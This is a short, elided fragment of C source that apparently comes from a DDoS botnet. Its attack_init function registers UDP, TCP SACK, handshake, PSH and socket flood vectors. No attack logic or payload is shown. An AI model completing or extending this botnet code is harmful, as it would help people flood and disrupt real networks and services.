...
/* we init our integers HERE in .C FILE */
int pid1, pid2; 
...
BOOL attack_init(void)
{
    ...
    add_attack(ATK_VEC_UDPHEX, (ATTACK_FUNC)attack_udphex);
    add_attack(ATK_VEC_SACK, (ATTACK_FUNC)attack_tcpsack);
    add_attack(ATK_VEC_HANDSHAKE, (ATTACK_FUNC)attack_handshake);
    add_attack(ATK_VEC_UDPRAND, (ATTACK_FUNC)attack_udprand);
    add_attack(ATK_VEC_SOCKET, (ATTACK_FUNC)attack_socket);
    add_attack(ATK_VEC_PSH, (ATTACK_FUNC)attack_tcppsh);
